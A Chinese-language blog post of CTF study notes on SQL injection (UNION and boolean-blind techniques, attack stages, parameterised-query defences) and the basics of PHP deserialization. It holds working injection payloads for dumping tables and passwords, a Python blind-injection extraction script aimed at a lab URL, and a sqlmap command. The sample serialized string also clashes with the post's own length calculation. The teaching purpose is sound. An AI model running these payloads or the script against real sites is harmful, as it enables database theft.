---
title: "30小时教你玩转CTF"
date: 2026-06-07
draft: false
categories: ["笔记"]
---
# web

## SQL注入

### SQL注入的起因

**SQL注入（SQL Injection，简称 SQLi）**的根本原因可以总结为八个字：**数据与代码边界模糊**。

当应用程序将用户输入的数据，直接拼接到了用于执行的 SQL 命令中时，数据库就无法分辨哪些是开发者原本写好的“控制指令”，哪些是用户输入的“纯数据”，从而导致用户输入的数据被当作 SQL 代码执行。

以下是导致 SQL 注入的具体核心原因和常见场景：

#### 1. 动态字符串拼接（最直接的元凶）

这是最常见的错误编写方式。开发者直接使用字符串相加或格式化字符串的方式，把用户提交的参数拼接到 SQL 语句中。

* **开发者原本预想的正常代码：**

  ```sql
  SELECT * FROM users WHERE username = 'admin' AND password = '123';
  ```

* **黑客输入的恶意数据：** 在用户名框输入 `admin' OR '1'='1`

* **实际执行的 SQL 语句：**

  ```sql
  SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '123';
  ```

  > **原理：** 由于 `'1'='1'` 永远成立，数据库会直接跳过密码验证，将用户数据全部泄露。

#### 2. 缺乏严格的输入验证与过滤

系统对用户输入的内容过于“信任”，没有在数据进入数据库之前进行合规性检查。

* **没有转义特殊字符：** 未对单引号（`'`）、双引号（`"`）、分号（`;`）、注释符（`--` 或 `#`）等 SQL 关键符号进行转义或过滤。
* **未限制数据类型：** 例如，程序本需要一个数字类型的 `id`（如 `SELECT * FROM articles WHERE id = 1`），但因为没有强制检查输入是否为整数，导致攻击者可以输入 `1 UNION SELECT...` 拼接恶意查询。

#### 3. 盲目信任“隐藏”的输入源

很多开发者只对表单中的文本输入框（如用户名、密码）做防护，却忽略了其他攻击者可以篡改的输入来源：

* **URL 参数（GET 请求）：** 如 `?id=5`
* **HTTP 请求头：** 如 `User-Agent`、`Referer`、`Cookie` 等（这些常被用来进行日志记录或数据统计，也可能触发注入）。
* **隐藏表单域或下拉菜单：** 攻击者可以通过浏览器开发者工具直接修改前端的 HTML 值再提交。

#### 4. 数据库权限过高（推波助澜）

虽然数据库权限过高不是 SQL 注入的触发起因，但它是**导致灾难扩大的关键原因**。

* 如果 Web 应用程序连接数据库时，使用的是 `root` 或 `sa` 等超级管理员账号，一旦发生 SQL 注入，攻击者不仅能读取当前网站的数据，甚至能跨库查询、读写服务器本地文件（如使用 `LOAD_FILE()`），或者直接执行系统命令控制整台服务器。

####  核心防御：参数化查询

要彻底根治 SQL 注入，核心方法是**参数化查询（Parameterized Queries / Prepared Statements）**。

在使用预编译语句时，数据库会先将 SQL 语句的结构编译好（例如：`SELECT * FROM users WHERE username = ?`）。之后无论用户输入什么内容（哪怕输入了一整段恶意代码），数据库也只会把它当成一个**纯字符串字面量**填入问号处，而绝不会将其当作指令去执行。

### 数据库的基本结构

库    A学校、B学校、…

表    1班、2班、…

列    学号、姓名、成绩

数据  101、张三、60分

### 联合注入

**联合注入（UNION-based SQL Injection）** 是 SQL 注入中一种非常经典且高效的攻击方式。它的核心在于利用 SQL 中的 `UNION` 操作符，将攻击者自定义的查询结果“拼接到”原始查询结果中，从而通过原本正常的页面将数据库中的敏感信息直接“回显”出来。

#### 1. 联合注入的前提条件

并非所有的注入点都能使用联合注入，它通常需要满足以下两个硬性条件：

- **页面有回显：** 网页上必须有能够显示查询结果的地方（例如：搜索结果页面、个人资料页、文章详情页等）。如果后端执行了查询但页面什么都不显示（盲注），则无法使用此方法。
- **联合查询的列数必须一致：** `UNION` 操作符要求前后两个查询语句具有相同的列数。

#### 2. 联合注入的工作流程

攻击者通常遵循以下三个步骤进行：

##### 第一步：判断列数（Order By）

利用 `ORDER BY` 来推测原 SQL 语句查询的字段数量。

- 注入：`1' ORDER BY 1#` （正常）
- 注入：`1' ORDER BY 2#` （正常）
- 注入：`1' ORDER BY 3#` （如果报错，说明查询的列数只有 2 列）

##### 第二步：寻找回显位

确认列数后，通过 `UNION SELECT` 尝试在页面上定位哪个字段的内容会被展示出来。

- 注入：`1' UNION SELECT 1, 2#`
- **分析：** 如果页面上原本显示“标题”的地方变成了数字“1”，显示“内容”的地方变成了数字“2”，说明第 1 和 第 2 个字段都是可回显的。

##### 第三步：获取敏感信息

确定了回显位后，就可以替换为真实的数据库查询语句，直接“拖取”数据。

- **查询数据库名/版本：** `1' UNION SELECT database(), version()#`
- **查询数据库中的表名：** `1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()#`
- **查询特定表中的数据（如用户名和密码）：** `1' UNION SELECT username, password FROM users#`

#### 3. 原理解析示意

> **核心逻辑：** 数据库将 `SELECT column1, column2 FROM original_table WHERE id = 1` 的结果与 `SELECT 'hack_user', 'hack_pass' FROM users` 的结果通过 `UNION` 纵向合并，最终将拼接后的完整结果返回给了前端页面。

#### 4. 为什么会有联合注入？（起因总结）

联合注入的本质依然是 **“代码与数据边界模糊”**，但它进一步利用了 SQL 的高级特性：

1. **未校验输入数据的结构：** 开发者没有限制用户对 SQL 查询逻辑的改变。
2. **数据库信息过于透明：** 数据库中存在 `information_schema` 等系统字典表，这使得攻击者可以通过 `UNION` 轻松遍历出整个数据库的结构（表名、列名），降低了攻击门槛。
3. **程序反馈过于详细：** 页面直接输出了查询结果，甚至在发生错误时返回了详细的 SQL 错误信息，为攻击者提供了精准的“路标”。

#### 5. 防御建议

- **依然是参数化查询：** 这是防御联合注入最有效的手段。一旦使用了预编译，`UNION` 关键字将直接被作为普通字符串处理，无法改变 SQL 逻辑结构。
- **权限最小化：** 确保 Web 用户仅拥有其必需的权限（例如：只读权限，或仅限特定表的增删改查），禁止其访问系统架构信息。
- **屏蔽错误回显：** 在生产环境中关闭数据库报错提示，避免通过错误信息泄露表名、列名或数据库类型。

### 布尔盲注

**布尔盲注（Boolean-based Blind SQLi）** 是一种当页面**不会直接回显数据**，也不会直接显示错误信息，但**会根据查询结果的真假呈现不同页面状态**时使用的攻击技术。

在这种情况下，攻击者无法使用 `UNION` 来直接读取数据，只能通过“问问题”的方式，让数据库通过 `TRUE` 或 `FALSE` 来回答。

#### 1. 核心逻辑：像玩“二十个问题”

布尔盲注的本质是**构造逻辑判断**，通过观察页面上的细微差异（例如：页面是否正常加载、是否显示特定的欢迎词）来推断数据。

- **如果条件为真 (TRUE)：** 页面正常显示。
- **如果条件为假 (FALSE)：** 页面显示错误信息、空白页或特定的“搜索无结果”。

#### 2. 攻击过程演示

假设我们要猜解数据库的名字，第一个字母是什么？

##### 第一步：猜长度

通过 `length()` 函数判断数据库名的长度。

- 输入：`1' AND length(database()) = 1--+` （页面异常）
- 输入：`1' AND length(database()) = 5--+` （页面正常）
- **结论：** 数据库名长度为 5。

##### 第二步：逐位猜解字符

使用 `ascii()` 和 `substr()` 函数，配合二分法猜解每个字符的 ASCII 码值。

- **尝试第一个字母的 ASCII 值是否大于 100：** `1' AND ascii(substr(database(), 1, 1)) > 100--+`
- **如果页面正常：** 说明第一个字母的 ASCII 码大于 100。
- **如果页面异常：** 说明第一个字母的 ASCII 码小于等于 100。

通过不断调整范围，你可以精确地确定每一个字符的 ASCII 值，进而拼接出完整的数据库名。

#### 3. 布尔盲注的常用函数

在构造布尔盲注 Payload 时，这几个函数是“武器库”：

| 函数       | 作用                | 示例                              |
| ---------- | ------------------- | --------------------------------- |
| `substr()` | 截取字符串          | `substr("security", 1, 1)` -> 's' |
| `ascii()`  | 返回字符的 ASCII 码 | `ascii('s')` -> 115               |
| `length()` | 返回字符串长度      | `length(database())`              |
| `if()`     | 条件判断            | `if(expr1, expr2, expr3)`         |

#### 4. 自动化攻击（脚本编写思维）

由于布尔盲注需要猜测大量字符，纯手工输入效率极低。通常我们会编写 Python 脚本来自动化请求：

```Python
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import time

# 目标 URL 模板
# 对应：数据库名、表名、列名、数据内容
payload_templates = [
    "http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select database()),%s,1))=%d--+",
    "http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%s,1))=%d--+",
    "http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='answer'),%s,1))=%d--+",
    "http://127.0.0.1/sqli/3.php?id=0 or ascii(substr((select group_concat(flag) from answer),%s,1))=%d--+"
]

def get_data(url_template):
    result = ""
    # 外层循环：遍历字符位置
    for i in range(1, 100):
        found = False
        # 内层循环：遍历 ASCII 字符 (33-126 为可打印字符)
        for j in range(33, 127):
            payload = url_template % (i, j)
            try:
                # 发送请求
                s = requests.get(payload, timeout=5)
                # 判断逻辑：页面中包含"查询"字样表示匹配成功
                if "查询" in s.text:
                    result += chr(j)
                    print(f"[*] 当前结果: {result}")
                    found = True
                    break
            except Exception as e:
                print(f"[!] 请求错误: {e}")
                time.sleep(1) # 遇到错误稍作休息
        
        # 如果这一位遍历完所有字符都没找到（即字符已结束），则跳出
        if not found:
            break
    return result

if __name__ == "__main__":
    for template in payload_templates:
        print(f"\n[+] 开始获取新目标数据...")
        final_data = get_data(template)
        print(f"[!] 获取完成: {final_data}")
        print("-" * 30)
```

##### 1. 核心逻辑架构：盲注的本质

盲注（Blind SQLi）与联合注入（UNION-based）最大的区别在于：**盲注不需要页面回显 SQL 查询结果**。它就像是玩“猜数字”游戏，脚本通过不断提问（发送 Payload），数据库只回答“是”或“否”。

- **提问方式**：脚本构造一个 `WHERE` 条件，如果结果为真，页面内容包含“查询”；如果为假，页面不包含“查询”。
- **读取方式**：利用 `SUBSTR()` 一次只获取一个字符，通过 `ASCII()` 将字符转为数字进行范围比对（二分法或枚举）。

##### 2. 详细代码拆解

###### A. 构造 Payload (SQL 层面)

```SQL
id=0 or ascii(substr((select database()), %s, 1))=%d--+
```

- `id=0`：通常是一个不存在的 ID，目的是让原本的查询结果为空，从而使 `OR` 后面的注入条件生效。
- `substr(..., %s, 1)`：这是切片函数。`%s` 是当前字符的索引（第 1 位、第 2 位...），`1` 表示截取长度为 1。
- `ascii(...) = %d`：将获取到的字符转换为 ASCII 码（如 'a' 转换为 97），然后与 `%d` 进行比对。
- `--+`：注释掉 SQL 语句后面的部分（如原始查询中的 `ORDER BY` 或其他逻辑），保证注入语句的完整性。

###### B. 自动化获取流程 (Python 层面)

```Python
for i in range(1, 100):              # 外层：定位字符位置
    for j in range(33, 127):         # 内层：暴力枚举 ASCII 码
        payload = url % (i, j)       # 构造 URL
        s = requests.get(payload)    # 发送请求
        if "查询" in s.text:          # 核心：判断“盲注”结果
             result += chr(j)        # 若为真，记录字符
             break                   # 找到字符，进入下一个位置
```

##### 3. 为什么脚本会这样设计？

1. **为什么是 `range(33, 127)`？** ASCII 码中，33 到 126 是键盘上可打印的字符（数字、字母、常用符号）。0-32 是控制字符（如换行、回车），对于数据库名称或表名，这些字符几乎不会出现。
2. **为什么用 `group_concat()`？** 盲注通常无法一次性获取多行结果。`group_concat()` 将所有表名或列名合并成一个很长的字符串，从而让脚本可以用循环遍历整个字符串。
3. **如何判断“真”与“假”？** 脚本利用了 `if "查询" in s.text`。
   - **真 (True)**：页面返回正常数据或特定标记，包含“查询”关键词。
   - **假 (False)**：页面可能显示“未找到结果”或只是空白，不包含“查询”关键词。

#### 5. 为什么会有这种漏洞？

- **页面逻辑耦合：** 开发者在后端代码中，将数据库的查询结果直接作为页面逻辑的分支条件。例如：`if ($result) { echo "欢迎"; } else { echo "未找到"; }`。
- **缺乏防御：** 开发人员认为只要不把数据直接打印在屏幕上就是安全的，却忽略了**这种“真假回显”本身就泄露了数据库内部逻辑**。

### SQL注入过程

SQL 注入的过程通常遵循一个标准化的逻辑链条。对于初学者或安全研究人员来说，可以将其拆解为五个核心阶段。

#### SQL 注入的五个攻击阶段

##### 1. 发现注入点 (Detection)

攻击者首先会扫描 Web 应用中的交互入口，尝试通过输入特殊字符触发异常。

- **输入测试：** 在 URL 参数、搜索框、登录表单等位置输入 `'`, `"`, `)`, `#`, `--` 等字符。
- **判断依据：** 如果页面出现数据库错误提示、页面显示内容异常、或者响应时间与正常情况不同，则说明该参数可能存在注入点。

##### 2. 判断注入类型 (Fingerprinting)

确认存在注入点后，需要判断注入的类型，以便选择对应的策略。

- <u>**数字型 vs 字符型：** 判断后端代码是否使用了引号包裹参数。</u>
- **注入方式：**
  - **联合注入 (UNION-based)：** 页面有直接回显。
  - **报错注入 (Error-based)：** 页面不回显数据，但会显示数据库的报错信息。
  - **布尔盲注 (Boolean-based)：** 页面根据查询真假显示不同内容（如“欢迎登录” vs “账号错误”）。
  - **时间盲注 (Time-based)：** 通过注入 `SLEEP()` 函数，观察页面响应延迟来判断逻辑真假。

##### 3. 探测数据库结构 (Enumeration)

利用数据库自带的元数据表（如 MySQL 中的 `information_schema`）获取权限和结构。

- **获取数据库名：** `... UNION SELECT 1, database(), 3--`
- **获取表名：** `... UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--`
- **获取列名：** `... UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--`

##### 4. 获取敏感数据 (Exfiltration)

当已知表名（如 `users`）和列名（如 `username`, `password`）后，通过拼接查询语句获取具体内容。

- **攻击载荷：** `SELECT username, password FROM users`
- **结果：** 页面直接显示出数据库中存放的所有账号和密码。

##### 5. 后渗透与提权 (Post-Exploitation)

根据数据库权限，攻击者可能进一步扩大影响。

- **写文件：** 如果拥有 `FILE` 权限且知道服务器物理路径，可使用 `INTO OUTFILE` 写入一句话木马。
- **执行系统命令：** 如果是 SQL Server 或高权限的 MySQL，可能尝试调用系统存储过程进行提权。

### 给安全学习者的建议

- **观察响应差异：** 在处理盲注（Blind SQLi）时，重点观察 **HTTP 响应包的状态码、内容长度 (Content-Length) 或响应时间**，这是判断注入是否成功的核心。
- **使用标准工具链：** 在练习（如 CTF）或合法测试中，`sqlmap` 是最常用的自动化工具。它能自动处理上述所有阶段。
  - *命令示例：* `sqlmap -u "http://target.com/page.php?id=1" --dbs`
- **防御意识：** 无论攻击过程多么复杂，最终的防御逻辑永远是 **“预编译” (Prepared Statements)**。只要将数据和指令彻底隔离开，SQL 注入就失去了执行的根基。

## PHP反序列化漏洞

序列化：将PHP对象压缩并按照一定格式转换成字符串过程    serialize() 

反序列化：从字符串转换回PHP对象的过程                               unserialize()     

目的：为了方便PHP对象的传输和存储

### 序列化实例

```php
<?php
class test
{
    private $flag = 'Inactive';
    protected $test = "test";
    public $test1 = "test1";

    public function set_flag($flag)
    {
        $this->flag = $flag;
    }

    public function get_flag()
    {
        return $this->flag;
    }
}

$object = new test();
$object->set_flag('Active');
$data = serialize($object);
echo $data;
?>
```

#### 1. 序列化结果分析

当你运行这段代码时，输出的序列化字符串（使用 `var_dump` 或 `echo`）会是这样的：

```
O:4:"test":3:{s:11:"testflag";s:6:"Active";s:7:"*test";s:4:"test";s:5:"test1";s:5:"test1";}
```

#### 2. 为什么属性名变长了？（核心知识点）

在序列化字符串中，非 `public` 属性的表示方式是特殊的，因为它们在序列化时会被添加前缀：

- **`private` 属性**：前缀是类名。
  - 原属性名：`flag`
  - 序列化名：`\0类名\0属性名`。例如 `\0test\0flag`。
  - **注意**：这里的 `\0` 代表 ASCII 码为 0 的空字符（null byte）。在字符串长度计算中，它占 1 个字符。所以 `\0test\0flag` 的长度是 `1 + 4 + 1 + 4 = 10`。
- **`protected` 属性**：前缀是 `*`（星号）。
  - 原属性名：`test`
  - 序列化名：`\0*\0属性名`。例如 `\0*\0test`。
  - 长度计算：`1 + 1 + 1 + 4 = 7`。
- **`public` 属性**：无前缀。
  - 原属性名：`test1`
  - 序列化名：`test1`。

#### 3. 这对安全测试意味着什么？

如果你在进行反序列化漏洞攻击（或解 CTF 题）时，需要手动构造序列化字符串，**必须遵循上述格式**，否则 `unserialize()` 函数将无法正确恢复对象属性。

- **手动构造时的陷阱**：很多人在构造 Payload 时会忘记包含 `\0` 空字符，导致反序列化失败，程序报错或返回 `false`。

- **如何生成正确的字符串**： 为了避免手动计算长度和处理不可见字符带来的错误，建议使用你在练习时编写的 PHP 脚本来生成合法的序列化字符串：

  ```php
  <?php
  $obj = new test();
  $obj->set_flag('Active');
  echo serialize($obj); // 这样生成的字符串是最准确的
  ?>
  ```

**总结**： 理解 `private` 和 `protected` 属性序列化后的这种“带空字节前缀”的特殊格式，是绕过反序列化防御、精准篡改对象属性的关键。

### 魔术方法

在 PHP 面向对象编程中，**魔术方法（Magic Methods）** 是一组以双下划线 `__` 开头的特殊函数。它们不需要显式调用，而是在特定的**触发时机**由 PHP 引擎自动调用。

魔术方法是 PHP 反序列化漏洞的核心，因为它们为攻击者提供了“自动执行恶意逻辑”的入口。

#### __construct

```php
<?php
class A
{
    function __construct()
    {
        echo "This is a construct function";
        //...
    }
}
$a = new A();
?>
```

**触发时机**：当你执行 `new A()` 时，PHP 引擎会自动寻找类中的 `__construct` 方法并立即执行其中的代码。

**应用场景**：通常用于初始化对象的属性、建立数据库连接或设置默认配置。